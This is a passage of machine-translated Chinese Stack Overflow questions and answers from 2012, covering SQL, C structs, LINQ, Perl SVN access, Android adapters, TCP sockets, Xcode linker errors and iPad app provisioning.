O--O-------------O-------------O
|ID|   my_col_1  |   my_col_2  |
O--O-------------O-------------O
|0 | fskdjfh     | jfkhgdkfj   |
|1 | NULL        | hfkjsdh     |
|2 | jfkdhsdkjh  | NULL        |
|3 | fdfhkjh     | NULL        |
|4 | NULL        | NULL        |
O--O-------------O-------------O 
```

`SELECT COUNT(my_col_1)`将返回 3

`SELECT COUNT(my_col_2)`将返回 2

`SELECT COUNT(*)`将返回 4

# visual-studio-2010 - 我可以使“在解决方案中发现服务”适用于基于 Windows 服务的 WCF 服务吗？

> ID：13271865
> 
> 赞同：1
> 
> 时间：2012-11-07T14:35:12.650
> 
> 标签：visual-studio-2010, wcf, windows-services, hosting

我有一个带有两个项目的 VS2010 解决方案，每个项目都包含一个托管 WCF 服务的 Windows 服务。我还有另一个项目作为使用这些服务的解决方案的一部分。

当我部署基于 Windows 服务的 WCF 服务，然后通过 VS 添加服务引用时，一切正常，但我想通过`Add Service Reference`=> `Discover`=>添加服务引用`Services in Solution`。不幸的是，这似乎只适用于直接基于我无法使用的 WCF 服务模板的项目。[我还尝试按照MSDN 上](http://social.msdn.microsoft.com/forums/en-US/wcf/thread/bbc6d1f6-15f1-40b6-a96d-ab8a9fb52048/)的建议为各个项目编辑 .csproj 文件，但这也不起作用。

有没有办法让这个工作，所以我不必将我的服务部署到测试服务器，然后使用它的 URL 添加服务引用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T16:48:06.313

似乎没有直接的方法可以做到这一点。我所做的是基于 WCF 模板添加项目并从 Windows 服务项目中引用这些项目。这样，我可以使用`Discover`=>`Services in Solution`功能，同时将 WCF 服务作为 Windows 服务托管。

# c - 在单独的头文件中定义的结构

> ID：13271870
> 
> 赞同：1
> 
> 时间：2012-11-07T14:35:29.307
> 
> 标签：c, header, struct

LMlib.h

```
#ifndef LMlib_H
#define LMlib_H
#endif

#define MAX_IP_LENGTH 15         
#define MAX_TABLE_ROWS 255

struct ForwardingTableRow
{
        char address[MAX_IP_LENGTH];
        int subnetMask;
        int interface;
};

typedef struct ForwardingTableRow ForwardingTableRow; 
```

LMlib.c

```
#include <stdio.h>
#include <math.h>
#include "LMlib.h"

void ReadForwardingTable(FILE* f,ForwardingTableRow * table)
{
        int i;
        for(i=0;i<MAX_TABLE_ROWS;i++)
        {
                fscanf(f,"%s %d %d",&table.address[i],&table.subnetMask[i],&table.interface[i]);
        }

} 
```

编译器命令：

> cc LMlib.c LMlib.h main.c -lm

错误：

```
LMlib.c: In function ‘ReadForwardingTable’:
LMlib.c:11:27: error: request for member ‘address’ in something not a structure or union
LMlib.c:11:45: error: request for member ‘subnetMask’ in something not a structure or union
LMlib.c:11:66: error: request for member ‘interface’ in something not a structure or union 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T14:39:09.110

你有三个问题：第一个是你没有正确使用数组索引。`table`变量是数组，而不是结构成员：

```
fscanf(f, "%s %d %d",
    table[i].address,
    &table[i].subnetMask,
    &table[i].interface); 
```

第二个问题与您的问题无关，但可能会导致将来出现麻烦。这是您拥有的包含后卫。`#endif`应该在文件的末尾*，*否则你只保护单个`#define`而不是别的。

第三个也是最严重的问题是你在这个`address`领域只有一个角色。IP 地址的最大长度为 15，这是正确的，但如果要将其视为字符串，则还需要为字符串终止符留出空间。将其声明为

```
address[MAX_IP_LENGTH + 1]; 
```

应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:39:36.057

这都是关于[运算符优先级](http://www.swansontec.com/sopc.html)的。`.`的优先级高于`&`，所以基本上它说：

```
 &(table.address)[i] 
```

and`table`不是结构，而是指向结构的指针。然后，你的索引是错误的，你索引的是结构的成员，而不是数组。

像这样重写：

```
 table[i].address 
```

# mysql - 这种情况下怎么写SQL语句？

> ID：13271874
> 
> 赞同：1
> 
> 时间：2012-11-07T14:35:33.657
> 
> 标签：mysql, sql

出于某种原因，我想更改数据库。

由于记录太多，无法手动更改这些值。

请告知如何编写此 SQL，谢谢。

从：

```
 id  percentage    type
  1     6        services
  1     10       testing
  3     8        services
  3     20       testing
  6     61       services
  6     90       testing 
```

到：

```
id percentage    type
1     10       services
1     10       testing
3     20       services
3     20       testing
6     90       services
6     90       testing 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:37:25.467

使用相关查询，您可以这样做：

```
SELECT 
  t1.id,
  (SELECT MAX(t2.percentage) 
   FROM table1 t2 
   WHERE t2.id = t1.id) percentage,
  type
FROM Table1 t1 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!2/e1cfc/1)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T14:39:03.323

如果您只想选择，请查看[Mahmoud Gamal 的答案](https://stackoverflow.com/a/13271907/491243)

但是，如果您想永久更改该值，请使用`UPDATE`

```
UPDATE  tableName a
        INNER JOIN
        (
            SELECT id, MAX(percentage) AS maxPercentage
            FROM tableName
            GROUP BY id
        ) b ON a.ID = b.ID
SET a.percentage = b.maxPercentage; 
```

*   [**SQLFiddle 演示**](http://www.sqlfiddle.com/#!2/0dbe6/1)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-07T14:39:31.223

编写一个参考表以匹配您的服务和测试值之间的比例（参见下面的示例），然后根据参考表的每一行编写一个更新查询：

```
id  service_val  testing_val
1       6        10
2       8        20
3       61       90 
```

在此表上运行全选并以 php、python 等方式遍历结果将允许您动态替换 mysql 查询中的值。这种方法允许这两个值与其他答案不具有直接相关性（即：服务不必是测试的百分比）

# c# - 重复值的部分取消分组列表

> ID：13271880
> 
> 赞同：7
> 
> 时间：2012-11-07T14:35:58.647
> 
> 标签：c#, linq

我知道如何使用 LINQ 对数据进行分组，也知道如何将其拆分为单独的项目，但我不知道如何仅部分取消分组。

我有一组看起来像这样的数据：

```
var data = new Dictionary<Header, Detail>()
{
    { new Header(), new Detail { Parts = new List<string> { "Part1", "Part1", "Part2" } } }
}; 
```

为了正确处理这个问题，我需要重复部分的每个实例都是字典中的单独条目（尽管它是否仍然是字典并不重要 -`IEnumerable<KeyValuePair<Header, Detail>>`完全可以接受）。但是，我不想`Parts`完全拆分列表 - 列表中有不同的部分很好。

具体来说，我希望最终数据如下所示：

```
{
  { new Header(), new Detail { Parts = new List<string> { "Part1", "Part2" } } },
  { new Header(), new Detail { Parts = new List<string> { "Part1" } } },
} 
```

对于更复杂的示例：

```
var data = new Dictionary<Header, Detail>()
{
    { new Header(1), new Detail { Parts = new List<string> { "Part1", "Part1", "Part2" } } },

    { new Header(2), new Detail { Parts = new List<string> { "Part1", "Part2" } } },

    { new Header(3), new Detail { Parts = new List<string> { "Part1", "Part2", "Part2", "Part2", "Part3", "Part3"} } }
};

var desiredOutput = new List<KeyValuePair<Header, Detail>>()
{
    { new Header(1), new Detail { Parts = new List<string> { "Part1", "Part2" } } },
    { new Header(1), new Detail { Parts = new List<string> { "Part1" } } },

    { new Header(2), new Detail { Parts = new List<string> { "Part1", "Part2" } } },

    { new Header(3), new Detail { Parts = new List<string> { "Part1", "Part2", "Part 3" } } },
    { new Header(3), new Detail { Parts = new List<string> { "Part2", "Part3" } } },
    { new Header(3), new Detail { Parts = new List<string> { "Part2" } } }
}; 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:10:52.733

不，实际上没有一个现有的 LINQ 函数可以完成所有这些工作。

本质上，如果您想`Parts`按每个字符串进行分组，并将每个组视为一行，那么您想要的是每个“列”。我使用辅助函数`GetNthValues`（旨在模拟 LINQ 风格的函数）来做到这一点。一旦你有了它，这几乎只是对每个部分进行分组、调用函数并将结果放回字典的问题。

```
public static Dictionary<Header, Detail> Ungroup(Dictionary<Header, Detail> input)
{
    var output = new Dictionary<Header, Detail>();

    foreach (var key in input.Keys)
    {
        var lookup = input[key].Parts.ToLookup(part => part);

        bool done = false;

        for (int i = 0; !done; i++)
        {
            var parts = lookup.GetNthValues(i).ToList();
            if (parts.Any())
            {
                output.Add(new Header(key.Value), new Detail { Parts = parts });
            }
            else
            {
                done = true;
            }
        }
    }

    return output;
}

public static IEnumerable<TElement> GetNthValues<TKey, TElement>(
    this ILookup<TKey, TElement> source, int n)
{
    foreach (var group in source)
    {
        if (group.Count() > n)
        {
            yield return group.ElementAt(n);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T15:29:09.093

Linq 在这里对你帮助不大，但这里有一个扩展方法，它可以解决问题：

```
public static IEnumerable<KeyValuePair<Header, Detail>> UngroupParts(
    this IEnumerable<KeyValuePair<Header, Detail>> data)
{
    foreach (var kvp in data)
    {
        Header header = kvp.Key;
        List<string> parts = kvp.Value.Parts.ToList();
        do
        {
            List<string> distinctParts = parts.Distinct().ToList();
            Detail detail = new Detail() { Parts = distinctParts };
            yield return new KeyValuePair<Header, Detail>(header, detail);

            foreach (var part in distinctParts)
                parts.Remove(part);
        }
        while (parts.Any());
    }
} 
```

用法：

```
var desiredOutput = data.UngroupParts(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:47:00.303

`SortedSet`从零件中的元素创建一个`Detail`。这，转换为 a `List`，是你的第一个组，`SortedSet`事实上，它只包含每个元素的一个实例`Detail`。

从原始`Detail`部分（或它的副本）中删除它。重复直到细节的大小为零。

编辑：

尝试使用类似于单个 Linq 语句的东西。为了简单起见，让我使用列表

```
var total = new List<List<string>>() { 
    new List<string>(), 
    new List<string>(), 
    new List<string>(), 
    new List<string>(), 
    new List<string>(), 
    new List<string>() 
};

//the statement

var q = k.Aggregate(total, (listOlists, singleStrin) => {
    listOlists.Where(l => !l.Contains(singleStrin)).First().Add(singleStrin);
    return listOlists;
}); 
```

基本上，我创建了一个累加器函数，*仅当列表不包含该元素时才*将元素添加到字符串列表中。列表本身包含在累加器列表中。你需要初始化累加器列表，否则 Linq 语句会变得更难看。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T14:57:46.960

这会将字符串列表分解为多个没有重复的字符串列表。

```
List<string> oldParts = new List<string> { "Part1", "Part2", "Part2", "Part2", "Part3", "Part3" };
List<List<string>> allLists = new List<List<string>>();

foreach (string currentPart in oldParts)
{
    foreach (List<string> currentList in allLists)
    {
         // if currentList doesn't have the part, then 
         //    add part to the currentList, and process next part
         if (!currentList.Contains(currentPart))
         {
             currentList.Add(currentPart);
             goto NextPart;
         }
    }
    // if we get here, the part is already contained on in the lists
    // so add a new list to allLists
    // and add the part to the new list
    allLists.Add(new List<string> { currentPart });

    NextPart: ;
} 
```

# perl - Perl 中的 SVN 访问

> ID：13271881
> 
> 赞同：2
> 
> 时间：2012-11-07T14:36:02.907
> 
> 标签：perl, svn

我想编写一个 perl 脚本，通过它我可以从 SVN 存储库中签出/签入文件。
我检查了一些 Perl 模块，如,`Alien::SVN`等。`SVN::Core``SVN::Client`

但我真的找不到任何文件签出或签入的功能。

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:43:22.607

[SVN::Client](https://metacpan.org/module/SVN%3a%3aClient)可以检出和检入文件。

这是有关如何结帐的文档的摘录：

> ```
>  $ctx->checkout($url, $path, $revision, $recursive, $pool); 
> ```
> 
> 使用 $path 作为新签出的工作副本的根目录，在 $revision 签出 $url 的工作副本。
> 
> `$revision`必须是数字、“HEAD”或日期。如果 $revision 不满足这些要求，`$SVN::Error::CLIENT_BAD_REVISION`则会提出。
> 
> 返回实际从存储库中签出的修订值。

对于签到：

> ```
> $ctx->commit($targets, $nonrecursive, $pool); 
> ```
> 
> 提交目标引用的文件或目录。将使用 log_msg 回调来获取提交的日志消息。
> 
> 如果 $targets 不包含路径（零元素），则不执行任何操作并立即返回而不会出错。
> 
> 使用以下任何操作在提交进行时调用通知回调：
> 
> ```
> $SVN::Wc::Notify::Action::commit_modified,
> $SVN::Wc::Notify::Action::commit_added,
> $SVN::Wc::Notify::Action::commit_deleted,
> $SVN::Wc::Notify::Action::commit_replaced,
> $SVN::Wc::Notify::Action::commit_postfix_txdelta. 
> ```
> 
> 用于`$nonrecursive`指示应忽略目录目标的子目录。
> 
> 返回一个 svn_client_commit_info_t 对象。如果提交信息对象的修订成员是`$SVN::Core::INVALID_REVNUM`并且没有引发错误，则提交是空操作；什么都不需要提交。

# html - 如何将用户重定向到另一个页面

> ID：13271888
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:36:12.867
> 
> 标签：html, xslt

```
 <xsl:choose>
              <xsl:when test="/doc/paymentHistory/paymentList/paymentlistlength='1>
             <script language="JavaScript" type="text/javascript">
                       javascript:OpenBrWindow('portal?cmd=dekontView&amp;AVPaymentDate=document.getElementsByName('AVPaymentDate')&amp;lang=tr','Preview','resizable=no,scrollbars=no,toolbar=no,status=no,menubar=no',990, 590,'true');
 return false;
            </script>

              <xsl:when>

        </xsl:choose> 
```

经过一些控制后，我想将用户重定向到另一个页面。我试过上面的代码它不起作用

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T16:51:44.020

试试这个：

```
...
<script>
    document.location.href='http://www.java2s.com';
</script>
... 
```

# java - Jasypt 的问题，package-info.java

> ID：13271891
> 
> 赞同：0
> 
> 时间：2012-11-07T14:36:27.337
> 
> 标签：java, jpa, jetty, guice, jasypt

我正在将 JPA 与 Guice、Jasypt 和 GWT+Jetty 服务器一起使用，

我正在尝试为加密列创建自定义类型。

我已经创建了 package-info.java 我有自定义类型。package-info.java 位于具有持久性类的包中。

在持久性类中，我对特定加密的列进行了注释。

当我在开发模式下启动码头时，出现以下错误：

javax.persistence.PersistenceException：[PersistenceUnit：persistenceUnit] 无法在 org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:889) 的 org.hibernate.ejb.Ejb3Configuration.buildEntityManagerFactory(Ejb3Configuration.java:914) 处构建 EntityManagerFactory(Ejb3Configuration.java:914) org.hibernate.ejb.HibernatePersistence.createEntityManagerFactory(HibernatePersistence.java:56)

……

引起：org.hibernate.MappingException：无法确定类型：encryptedDateAsString，在表：员工，列：[org.hibernate.mapping.Column（encrypted_birth_date）]

我做错了什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:52:19.290

可能是您`@TypeDef`的实体中缺少`encryptedDateAsString`您正在使用的类型的声明吗？

例如：

```
@Entity
@TypeDef {
  name = "encryptedDateAsString",
  typeClass = org.jasypt.hibernate4.type.EncryptedDateAsStringType.class
} 
```

编辑免责声明：我是 jasypt 的作者。

# android - Android 设备上的当前信号强度

> ID：13271893
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:36:29.310
> 
> 标签：android, telephony

无论如何要在Android设备上获取当前信号强度。我知道有一种方法可以让您收听信号强度的变化，但我迫不及待地需要知道当前的信号强度。任何帮助，将不胜感激。

问候，乙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:42:38.747

您可以注册 PhoneStateListener 并将最后更新的值保存到变量中，并在需要时访问它。这是您可以实时获得的最接近信号强度的近似值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-18T19:02:08.743

您可以从设备上的应用商店下载[https://play.google.com/store/apps/details?id=com.nolanlawson.logcat&hl=en](https://play.google.com/store/apps/details?id=com.nolanlawson.logcat&hl=en) ，当您进出 ssid 时，它会向您显示信号强度相当准确。希望这可以帮助。干杯。

# python - 与 Sqlalchemy 查询对象接口以扩展自定义查询类型

> ID：13271894
> 
> 赞同：4
> 
> 时间：2012-11-07T14:36:30.800
> 
> 标签：python, sql, sqlalchemy

我正在为我的模型添加分页功能。我可以使用mixin中的方法来做到这一点，我想我理解在这种情况下分页是什么，但我正在寻找添加查询，以便我可以在任何我想要的地方传递分页，而无需硬编码模型方法并且没有mixin例如：

```
Mymodel.query.filter(Mymodel.attr=='X').paginate(**args, **kwargs) 
```

flask-sqlalchemy 这样做，但我没有使用它，尽管我已经尝试过它以尝试提取一些功能。

所以如果我有这样的方法：

```
def paginate(self, page, per_page=20):
        items = self.limit(per_page).offset((page - 1) * per_page).all()
        return Pagination(self, page, per_page, self.count(), items) 
```

如何在 sqlalchemy 查询链中将其作为带有接口的东西插入和输出？我有点做并且不遵循它在flask-sqlalchemy中是如何完成的，但我想提取/学习如何做到这一点并在未来更好地控制查询，改进我对sqlalchemy的使用，所以我不完全知道我要去哪里，只是问一个问题，然后从那里开始。

长答案：继续阅读 sqlalchemy 文档和代码，直到我获得更深入的理解。我正在寻找扩展 orm.Query - 我已经完成了，但我不知道如何将它与我的项目联系起来，因为我不了解 sqlalchemy 的底层机制，但我认为我只需要将我的分页查询添加到我正在使用的声明性基础 Base 中，但一旦我重新开始工作就会看到。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-11-07T20:22:00.550

你读过这个吗？

[http://packages.python.org/Flask-SQLAlchemy/api.html?highlight=pagination#flask.ext.sqlalchemy.Pagination](http://packages.python.org/Flask-SQLAlchemy/api.html?highlight=pagination#flask.ext.sqlalchemy.Pagination)

它清楚地解释了要在烧瓶中使用带有 sqlalchemy 扩展的分页，您可以这样做：

```
class flask.ext.sqlalchemy.Pagination(query, page, per_page, total, items)¶ 
```

在您的具体情况下，您可以执行以下操作：

```
myquery = Mymodel.query.filter(Mymodel.attr=='X')
pagination = Pagination(myquery,page,per_page,total,items) 
```

然后在您的模板中，您可以使用此分页对象使用 render_pagination() 宏进行渲染

# magento - 在登陆页面上自动应用优惠券 - Magento 1.7

> ID：13271895
> 
> 赞同：1
> 
> 时间：2012-11-07T14:36:38.743
> 
> 标签：magento

我正在使用 Magento 1.7，我想知道是否有人知道如何在登录页面上自动应用优惠券。基本上，我希望用户访问特定的 URL，当他们登陆页面时，我想应用 %25 的折扣。

谁能指出我正确的方向？

# networking - tcp 以其实际长度发送而不是使用 sizeof 数据

> ID：13271903
> 
> 赞同：0
> 
> 时间：2012-11-07T14:37:12.000
> 
> 标签：networking, tcp, sizeof, tcp-ip

我正在尝试通过 tcp 发送一个小数据包，但我对它的大小有疑问。我的数据是 255 字节缓冲区：

```
buffer[0] = 0x00;
buffer[1] = 0x04;
buffer[2] = 0x06;
buffer[3] = 0x08;
buffer[4] = 0x01;
buffer[5] = 0x01; 
```

我用

```
send(sockfd,buffer,6,MSG_NOSIGNAL|MSG_DONTWAIT); 
```

但是当我使用 6 时无法发送数据。如果我使用发送如下：

```
 send(sockfd,buffer,sizeof(buffer),MSG_NOSIGNAL|MSG_DONTWAIT); 
```

然后发送数据，但接收方必须解析额外的 250 0x00 字节，我不想要它。为什么6不行。我也随机尝试 10 次，没有任何变化。

这是我的接收器代码任何东西都写在那一边：

```
 while(1) {
           ret = recv(socket,buffer,sizeof(buffer),0);
           if (ret > 0) 
                 printf("recv success");
            else
            {
               if (ret == 0)
                   printf("recv failed (orderly shutdown)");
               else
                   printf("recv failed (errno:%d)",errno);
            }
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T22:17:20.637

摆脱 MSG_DONTWAIT。这仅在套接字发送缓冲区已满且无法发送数据时有其他事情要做时才有用。由于您没有检查 send() 的结果，显然您对该条件不感兴趣。但是，无论如何您都*必须*检查发送的结果，因为您可能遇到了错误，因此请修复您的代码以执行此操作。

# android - 在布局中显示字符串的一部分

> ID：13271911
> 
> 赞同：0
> 
> 时间：2012-11-07T14:37:39.050
> 
> 标签：android, string, android-layout, simplecursoradapter

我正在使用游标从 SQLite 数据库中读取数据，并使用适配器将其显示在 listView 中。这工作正常，但我现在想减少我在 listView 中显示的数据量。目前它显示以下内容：

```
John Smith, 25, Moday, Consultation, Dr. Harley
Jane Doe, 41, Wednesday, Surgery, Dr. Pope 
```

我希望它显示的是：

```
John Smith, 25, Mo, Con, Harley
Jane Doe, 41, We, Sur, Pope 
```

基本上我想解析 3 个字符串。问题是游标适配器在其构造函数中将数据库的列作为字符串数组，所以我不知道在哪里对其执行解析操作。我尝试了许多不同的选项，但遇到无法识别的列 ID 错误和其他运行时错误。谁能指出我正确的方向？

创建适配器的方法：

```
private void fillList() {
        Cursor c = db.getApts();
        startManagingCursor(c);

        String[] from = new String[] {ModuleDB.KEY_AptCode,
                          ModuleDB.KEY_AptName,
                          ModuleDB.KEY_AptAge,
                          ModuleDB.KEY_AptDay,
                          ModuleDB.KEY_AptType,
                                  ModuleDB.KEY_AptDoc};
        int[] to = new int[] {R.id.Aptcode_entry,
                      R.id.AptName_entry,
                      R.id.AptAge_entry,
                      R.id.Aptday_entry,
                              R.id.Apttype_entry,
                              R.id.Aptdoc_entry};

        SimpleCursorAdapter aptAdapter = 
                new SimpleCursorAdapter(this, R.layout.apt_entry, c, from, to);
        setListAdapter(aptAdapter);

    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T15:00:00.260

1.）让您的活动实施 - ViewBinder

2.）匹配您的列并使用子字符串

```
public class YourActivity extends Activity
    implements SimpleCursorAdapter.ViewBinder {

   adapter.setViewBinder(this); //Put this line after your list creation and setlistAdapter

    @Override
    public boolean setViewValue(View view, Cursor cursor, int column) {
     //Showing for day, similarly for others
        int dayColumn = cursor.getColumnIndex(your day column name in quotes);
        if (column == dayColumn ) {
            String dayString = cursor.getString(dayColumn );
            ((TextView)view).setText(bodyString.subString(0, 3));

            return true; // Return true to show you've handled this column
        }
        return false;
    } 
```

}

另外 - @Simon 是对的 - 使用扩展光标适配器的自定义适配器总是更好，因为如果您的需求进一步发展，您以后可以更自由地修改它。这是一个如何使用自定义适配器并构建一个不错的列表的示例 - [http://www.androidhive.info/2012/02/android-custom-listview-with-image-and-text /](http://www.androidhive.info/2012/02/android-custom-listview-with-image-and-text/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:41:42.760

不确定您使用什么适配器，但假设所有数据都显示为单行，那么我将扩展该适配器并覆盖`toString()`它的方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:51:25.040

不要认为您可以在简单的适配器上覆盖 toString() 但这可能会有所帮助？

```
SimpleCursorAdapter aptAdapter= new SimpleCursorAdapter(this, R.layout.apt_entry, c, from, to);

 CursorToStringConverter stringConverter = new CursorToStringConverter() {    
    @Override
    public CharSequence convertToString(Cursor cursor) {
       return "Hello listview"; // whatever string you want to build using cursor.getString() etc
    }
 }; 

 aptAdapter.setCursorToStringConverter(stringConverter); 
```

[编辑] 刚刚检查了文档，SimpleCursorAdapter 没有 toString() 方法，也没有任何超类。

# clang - 体系结构 i386 链接器命令的未定义符号失败，退出代码为 1（使用 -v 查看调用）

> ID：13271912
> 
> 赞同：1
> 
> 时间：2012-11-07T14:37:39.367
> 
> 标签：clang, linker-errors, appdelegate, i386, invocation

我查看了其他有类似问题的问题，但我仍然无法弄清楚出了什么问题。这是我的第一个应用程序，其他答案没有多大意义。我不断收到同样的错误：

```
Ld /Users/brandonpayne/Library/Developer/Xcode/DerivedData/FordyceSchools-gcczvpeftaotknfzpktdnjoqzncf/Build/Products/Debug-iphonesimulator/FordyceSchools.app/FordyceSchools normal i386
cd /Users/brandonpayne/Desktop/FordyceSchools
setenv MACOSX_DEPLOYMENT_TARGET 10.6
setenv PATH "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/usr/bin:/Applications/Xcode.app/Contents/Developer/usr/bin:/usr/bin:/bin:/usr/sbin:/sbin"
/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang -arch i386 -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator5.1.sdk -L/Users/brandonpayne/Library/Developer/Xcode/DerivedData/FordyceSchools-gcczvpeftaotknfzpktdnjoqzncf/Build/Products/Debug-iphonesimulator -F/Users/brandonpayne/Library/Developer/Xcode/DerivedData/FordyceSchools-gcczvpeftaotknfzpktdnjoqzncf/Build/Products/Debug-iphonesimulator -filelist /Users/brandonpayne/Library/Developer/Xcode/DerivedData/FordyceSchools-gcczvpeftaotknfzpktdnjoqzncf/Build/Intermediates/FordyceSchools.build/Debug-iphonesimulator/FordyceSchools.build/Objects-normal/i386/FordyceSchools.LinkFileList -mmacosx-version-min=10.6 -Xlinker -objc_abi_version -Xlinker 2 -fobjc-arc -fobjc-link-runtime -Xlinker -no_implicit_dylibs -D__IPHONE_OS_VERSION_MIN_REQUIRED=50100 -framework UIKit -framework Foundation -framework CoreGraphics -o /Users/brandonpayne/Library/Developer/Xcode/DerivedData/FordyceSchools-gcczvpeftaotknfzpktdnjoqzncf/Build/Products/Debug-iphonesimulator/FordyceSchools.app/FordyceSchools 
```

架构 i386 的未定义符号：“_OBJC_CLASS_$_ViewController”，引用自：AppDelegate.o 中的 objc-class-ref ld：未找到架构 i386 的符号 clang：错误：链接器命令失败，退出代码为 1（使用 -v查看调用）

我在我的代码中找不到错误所在。请帮忙。

# c# - SurfaceInkCanvas 在绘制越界时缩放笔划

> ID：13271913
> 
> 赞同：3
> 
> 时间：2012-11-07T14:37:43.060
> 
> 标签：c#, pixelsense

我有一个`ScatterView`包含我应该能够绘制的图像。

```
<s:ScatterView HorizontalAlignment="Center" Margin="0,0,0,0" Name="desk" VerticalAlignment="Center">
    <s:ScatterViewItem Width="200" Height="200">
        <Grid>
            <Image Name="img1" Source="/Resources/Desert.jpg"/>
            <Viewbox>
                <s:SurfaceInkCanvas Name="cvs1"/>
            </Viewbox>
        </Grid>
    </s:ScatterViewItem>
</s:ScatterView> 
```

我注意到，每当我在图像的边界上画一条墨迹时，墨画布上的笔触都会按比例缩小，以便为更多东西腾出空间。我*不*希望这些笔画被缩小。我怎样才能改变这种行为？

[这](https://www.youtube.com/watch?v=n__YfQ0lxKc)是一个显示正在发生的事情的视频。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T16:48:46.567

我想到了。`Width`这种行为是由于我没有`Height`在`SurfaceInkCanvas`. 这应该可以解决问题：

```
<s:SurfaceInkCanvas Name="cvs1" Width="200" Height="200" /> 
```

# c - 如何使用 for 循环输入一个数字并按顺序计数 10 个更高的数字

> ID：13271922
> 
> 赞同：-7
> 
> 时间：2012-11-07T14:38:42.667
> 
> 标签：c, for-loop

如何让用户输入一个数字，然后程序将用户数字增加 10？

例如，用户输入 5 数字 5 这样的增量 5 6 7 8 9 10 11 12 13 14 15

到目前为止，这是我的代码。

```
int main (void)
{

    int i;

    for(i=1; i<10; i++);
    {
         printf("enter a number:");
         scanf("%d" , &i);
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:43:30.210

您可以使用两个变量：

*   `start`: 循环的第一个索引；
*   `end`: 循环的最后一个索引。

然后，程序很容易编写：

```
#include <stdio.h>

int start;
int end;   

scanf("%d", &start);

end = start + 10;

for (i = start; i < end; ++i)
    printf("%d\n", i); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:40:04.833

```
int main (void)
{      
     printf("enter a number:");

     int num;
     scanf("%d", &num);
     for (int i = num; i <= num + 10; i++) 
     { 
            printf("%d ", i);
     }

     printf("\n");

     return 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T15:49:11.800

做一个`while`循环。首先将计数器设置`i`为0，`i`和`number`和的结果将存储在result中，并且每次while循环重新开始都会发生这种情况，第一次会是`number + 1`（6）（原因`i`是1），`then number + 2`（7），`number + 3`（8 ), . . ., `number + 10`(15)。

PD：数字永远不会改变，它保持与您输入的相同值。

```
int main (void)
{
   int i, number, result;

   printf( "Enter the number: " );
   scanf( "%d", &number );

   i = 0;
   while ( result != ( number + 10 ) )
      printf( "%d", result = number + i );
      i++;  
   }

   return 0;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T14:41:38.010

```
int main (void) {
  int start;

  printf("enter a number:");
  scanf("%d" , &start);

  for(int i=0; i<=10; i++) {
    printf("%d",start+i);
  }
  return 0;
} 
```

这行得通吗？我相信我纠正了许多语法错误。如果您对我所做的更改有任何疑问，请发表评论，我很乐意为您提供帮助！

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-11-07T14:40:50.587

```
#include <stdio.h>

int main (void)
{    
    int i,n;

    printf("enter a number:");
    scanf("%d" , &n);

    for(i=0; i<10; i++)
    {
       printf("%d ",n);
       ++n;
    }

    return 0;
} 
```

# ipad - 为单个 iPad 制作应用程序

> ID：13271925
> 
> 赞同：0
> 
> 时间：2012-11-07T14:38:54.623
> 
> 标签：ipad

我正在寻找有关为单个 iPad 开发的一些说明。我在应用商店中有一个应用，但是我想制作自己的应用供个人使用，但不会提交到应用商店。

我是否可以开发应用程序并获得证书以在我的 iPad 上“测试”应用程序，然后继续使用它？我不想为一个企业帐户支付 299 美元来发布私人应用程序供单个 iPad 使用该应用程序！

我已经阅读过，现在我可能比以前更困惑！

任何帮助表示赞赏。

谢谢，加里

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:41:30.327

如果您进入 iOS 开发者计划（每年 99 美元），您将能够做您提到的事情：您将能够生成证书和配置文件并在您的设备上安装应用程序（实际上，最多 100 台设备）。

唯一的事情是您需要创建一个新的证书/配置文件并在证书到期时重建/重新安装您的应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:52:58.037

不管你怎么做，你总是需要对你的应用程序进行签名才能在设备上运行它。

所有的 Provisioning Profiles 都会过期，除了 App Store 的那些（你不能在 App Store 中发布你的 App 的情况下使用）。[因此，在这种情况下](https://stackoverflow.com/questions/9270989/ios-enterprise-provisioning-profile-expiration)，为企业帐户支付 299 美元甚至对您没有帮助。

但是，如果您只想在这台设备上运行该应用程序，您可以考虑越狱它。这将允许未签名的应用程序运行。

